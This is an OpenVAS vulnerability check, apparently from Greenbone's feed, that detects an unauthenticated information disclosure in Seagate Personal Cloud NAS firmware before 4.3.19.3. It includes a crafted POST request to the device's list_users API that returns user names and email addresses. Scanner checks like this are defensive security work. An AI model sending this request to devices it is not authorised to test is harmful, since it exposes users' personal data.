###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_seagate_personalcloud_info_discl_vuln.nasl 12260 2018-11-08 12:46:52Z cfischer $
#
# Seagate Personal Cloud < 4.3.19.3 Information Disclosure Vulnerability
#
# Authors:
# Christian Kuersteiner <christian.kuersteiner@greenbone.net>
#
# Copyright:
# Copyright (c) 2018 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation; either version 2 of the License, or
# (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

CPE_PREFIX = 'cpe:/h:seagate';

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.141482");
  script_version("$Revision: 12260 $");
  script_tag(name:"last_modification", value:"$Date: 2018-11-08 13:46:52 +0100 (Thu, 08 Nov 2018) $");
  script_tag(name:"creation_date", value:"2018-09-17 12:15:49 +0700 (Mon, 17 Sep 2018)");
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:N/A:N");

  script_tag(name:"qod_type", value:"exploit");

  script_tag(name:"solution_type", value:"VendorFix");

  script_name("Seagate Personal Cloud < 4.3.19.3 Information Disclosure Vulnerability");

  script_category(ACT_GATHER_INFO);

  script_copyright("This script is Copyright (C) 2018 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("gb_seagate_nas_detect.nasl");
  script_mandatory_keys("seagate_nas/detected");

  script_tag(name:"summary", value:"Seagate Personal Cloud is prone to multiple information disclosure
  vulnerabilities.");

  script_tag(name:"insight", value:"It was found that the web application used to manage the NAS is affected by
  various unauthenticated information disclosure vulnerabilities. The web application is configured with an HTML5
  cross-origin resource sharing (CORS) policy that trusts any Origin. In addition, the NAS is available using the
  personalcloud.local domain name via multicast Domain Name System (mDNS). Due to this it is possible to exploit
  this issue via a malicious website without requiring the NAS to be directly accessible over the internet and/or to
  know its IP address.");

  script_tag(name:"vuldetect", value:"Sends a crafted HTTP POST request and checks the response.");

  script_tag(name:"affected", value:"Seagate Media Server in Seagate Personal Cloud prior to version 4.3.19.3.");

  script_tag(name:"solution", value:"Update to firmware version 4.3.19.3 or later.");

  script_xref(name:"URL", value:"https://sumofpwn.nl/advisory/2017/seagate-personal-cloud-multiple-information-disclosure-vulnerabilities.html");
  script_xref(name:"URL", value:"http://knowledge.seagate.com/articles/en_US/FAQ/007752en");

  exit(0);
}

include("host_details.inc");
include("http_func.inc");
include("http_keepalive.inc");

if (!infos = get_app_port_from_cpe_prefix(cpe: CPE_PREFIX, first_cpe_only: TRUE, service: "www"))
  exit(0);

port = infos["port"];
CPE = infos["cpe"];

if (!dir = get_app_location(cpe: CPE, port: port))
  exit(0);

if (dir == "/")
  dir = "";

url = dir + "/api/external/8.0/simple_sharing.SimpleSharing.list_users";
data = '{"list_info":{"__type__":"ListInfo", "__version__":0, "__sub_version__":0, "__properties__":' +
       '{"limit":-1, "offset":0, "search_parameters":{"__type__":"Dict", "__sub_type__":"Unicode",' +
       ' "__elements__":{}}}}, "with_parameters":{"__type__":"List","__sub_type__":"Unicode","__elements__":{}}}';

req = http_post(port: port, item: url, data: data);
res = http_keepalive_send_recv(port: port, data: req, bodyonly: TRUE);

if ('{"user_list":' >< res && '"email":' >< res) {
  report = 'It was possible to obtain a list of users.\n\nResponse:\n' + res;
  security_message(port: port, data: report);
  exit(0);
}

exit(99);